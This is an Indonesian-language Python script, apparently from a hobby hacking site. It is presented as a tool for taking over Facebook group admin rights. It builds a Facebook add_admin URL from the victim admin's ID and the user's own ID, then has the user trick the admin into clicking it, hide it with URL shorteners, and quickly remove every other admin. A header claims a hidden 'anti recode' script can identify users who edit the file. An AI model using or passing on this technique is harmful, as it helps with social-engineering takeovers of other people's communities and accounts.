# Author : WenDev89
# JANGAN RECODE FILE INI KALAU TIDAK MAU TERJADI SESUATU YG TAK DIINGINKAN TERJADI. 
# KARNA UDA SAYA SISIPKAN SCRIPT ANTI RECODE, SAYA BISA TAU SIAPA KAMU ^_^
#

import os, sys, time
from termcolor import colored

# Set Colors ######

N = '\033[0m'

W = '\033[1;37m'

B = '\033[1;34m'

R = '\033[1;31m'

G = '\033[1;32m'

Y = '\033[1;33m'

C = '\033[1;36m'

##################

# Restart ####################

def restart_program():

   python = sys.executable

   os.execl(python, python, * sys.argv)

   curdir = os.getcwd()

##############################

os.system("clear")

print colored(" ")
print colored(" ") 
print colored('** Tool For TAKE OVER Admin Facebook Group by', 'white', 'on_blue'), colored('WenDev89', 'red', 'on_green'), colored('**to*', 'white', 'on_blue') 
print colored('MMMMMMMMMMMMMMMMMMMMMMMMM', 'blue'), colored('888888 888888 8888888 8  88888', 'red') 
print colored('MMMMMMMMMMMMMMMNNmdmmMMMM', 'blue'), colored('8    8 8    8 8  8  8 8  8   8', 'red') 
print colored('MMMMMMMMMMMMMMo-     mMMM', 'blue'), colored('8eeee8 8e   8 8e 8  8 8e 8e  8', 'red') 
print colored('MMMMMMMMMMMMMs   .+ooNMMM', 'blue'), colored('88   8 88   8 88 8  8 88 88  8', 'red') 
print colored('MMMMMMMMMMMMM:   yMMMMMMM', 'blue'), colored('88   8 88   8 88 8  8 88 88  8', 'red') 
print colored('MMMMMMMMMMsso.   /ossMMMM', 'blue'), colored('88   8 88eee8 88 8  8 88 88  8', 'red') 
print colored('MMMMMMMMMM          -MMMM', 'blue'), colored('================================', 'white', 'on_blue') 
print colored('MMMMMMMMMMyyy.   +yydMMMM', 'blue'), colored('888888 88888  888888 8   8 888888', 'red') 
print colored('MMMMMMMMMMMMM:   hMMMMMMM', 'blue'), colored('8    8 8   8  8    8 8   8 8    8', 'red') 
print colored('MMMMMMMMMMMMM:   hMMMMMMM', 'blue'), colored('8e     8eee8e 8    8 8e  8 8eeee8', 'red') 
print colored('MMMMMMMMMMMMM:   hMMMMMMM', 'blue'), colored('88  ee 88   8 8    8 88  8 88', 'red')  
print colored('MMMMMMMMMMMMM:   hMMMMMMM', 'blue'), colored('88   8 88   8 8    8 88  8 88', 'red')  
print colored('MMMMMMMMMMMMM:   hMMMMMMM', 'blue'), colored('88eee8 88   8 8eeee8 88ee8 88', 'red')
print colored('==========================================================', 'white', 'on_blue')
print colored(" ") 
print colored('Select a Language :', 'cyan') 
print colored('Pilih Bahasa :', 'cyan') 
print(" ")
print colored('[ 01 ]', 'cyan'), colored('INDONESIA', 'white', 'on_red') 
print(" ") 
print colored('[ 02 ]', 'cyan'), colored('ENGLISH', 'white', 'on_blue') 
print colored(' ')
 
bahasa = raw_input("%s(#)%sPilih/Choose :%s" % (C, W, B))

try:

	file = open("link.txt", 'w')

except(IOError):

	print "ERROR"

	sys.exit()

if bahasa.strip() in "01 1".split():

  print colored('INDONESIA', 'white', 'on_red') 

  print(" ") 

tahap1 = raw_input("%s[1]%s Cari grup di Facebook yang ingin kamu HACK!!%s[ENTER]%s" % (W, G, R, N))
print (" ") 
print "%s[ OK ]%s" % (G, N)
print (" ") 
tahap2 = raw_input("%s[2]%s Setelah itu cari Admin Group, klik URL Facebook Admin Group nya, salin ID Admin Group tsb%s[ENTET]%s" % (W, G, R, N))
print (" ")
print "%s[ OK ]%s" % (G, N)
print (" ") 
tahap3 = raw_input("%s[3]%s Selanjutnya masuk ke Profile Facebook mu, dan salin juga ID Facebook mu%s[ENTER]%s" % (W, G, R, N))
print "%s[ OK ]%s" % (G, N)
tahap4 = raw_input("%s[4]%s PERHATIAN!! Jangan via aplikasi Facebook, tapi via Browser, lebih mudah melihat & menyalin ID nya%s[ENTER]%s" % (W, G, R, N)) 
print (" ") 
print "%s[ OK ]%s" % (G, N)
print (" ") 
tahap5 = raw_input("%s[5]%s Setelah ID Facebook Admin Group & ID Facebook mu uda disalin, sekarang kita kombinasikan kedua ID nya%s[ENTER]%s" % (W, G, R, N)) 
print (" ") 
grup = raw_input(" %s[*]%s ID ADM GROUP%s >>>%s " % (W, R, W, G))
print (" ") 
anda = raw_input(" %s[*]%s ID KAMU%s >>>%s " % (W, R, W, G))
print (" ") 
print "%s(*)%sHasil%s >>>%shttps://m.facebook.com/group/add_admin/?group_id=&user_id=&added&_rdrChange%s" % (W, R, C, grup, anda, N)
print (" ") 
file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (grup, anda))
print (" ") 
tahap6 = raw_input("%s[6]%s Salin link URL hasil kombinasi tsb lalu kirimkan ke %sADMIN GROUP%s. Atau bisa buka file %slink.txt%s , dan copy URL nya utk dikirim ke %sADMIN GROUP%s. %s[ENTER]%s" % (R, W, C, W, R, W, C, G, N))
print (" ") 
tahap7 = raw_input("%s[7]%s Selanjutnya tinggal menunggu link URL nya diklik oleh %sADMIN GROUP%s[ENTER]%s" % (R, W, C, G, N))
print (" ") 
tahap8 = raw_input("%s[8]%s Kalo uda dapat notifikasi bahwa kamu uda dilantik secara terhormat menjadi %sADMIN GROUP%s, maka kamu harus secepatnya juga menendang semua %sADMIN GROUP%s yg ada di GROUP tsb sebelum salah satu dari %sADMIN GROUP%s itu sadar, bisa bisa malah senjata makan tuan.. Hehehe.%s[ENTER]%s" % (R, W, C, W, C, C, W, G, N))
print (" ") 
tahap9 = raw_input("%s[9]%s Good Luck!! Don't Forget to Visit, Like, Share, & Follow%s https://www.wendev89.site%s[ENTER]%s" % (W, G, R, G, N))
print (" ") 
time.sleep(1)
print "%s[*]%sNB%s:%s ADMIN yg pintar akan langsung menyadari Link URL apa yg anda kirimkan padanya, jadi saya sarankan menggunakan Shortlink untuk memyamarkan Link URL tsb. Bisa dengan%s goo.gl%s atau%s bit.ly%s" % (W, R, W, R, G, R, G) 
time.sleep(1)
print "%sTerima Kasih.%s Sudah bersedia menggunakan program ini.%s" % (R, G, N) 
time.sleep(1)
print colored('Script by', 'green'), colored('WenDev89', 'yellow', 'on_red') 

sys.exit()



